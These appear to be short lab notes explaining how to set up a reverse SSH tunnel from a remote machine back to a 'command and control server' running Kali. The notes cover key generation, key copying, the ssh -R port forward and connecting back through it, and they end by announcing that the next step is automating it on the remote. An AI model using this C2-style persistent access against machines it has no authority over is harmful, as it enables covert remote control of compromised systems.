
On the remote machine create an entry in the hosts file for the command and control server.  


On the remote machine you want to connect to the command and control server generate the rsa key pair.

> ssh-keygen -t rsa -b 4096

Create an account on the command and control server that matches the user you created the key for. Then copy the key to the command and control server from the remote machine. use the login of the command and control server to do this.  

> ssh-copy-id -i $HOME/.ssh/id_rsa.pub user@server1.cyberciti.biz

Now test ssh to the command and control server.

> ssh frodo@kali

On the remote test the reverse ssh. The user is the user from the command and control server.

> ssh -R 2222:localhost:22 frodo@kali -i /home/kali/.ssh/id_rsa

On the command and control server.

> ssh -p 2222 kali@localhost

If this works next we want to automate on the remote.

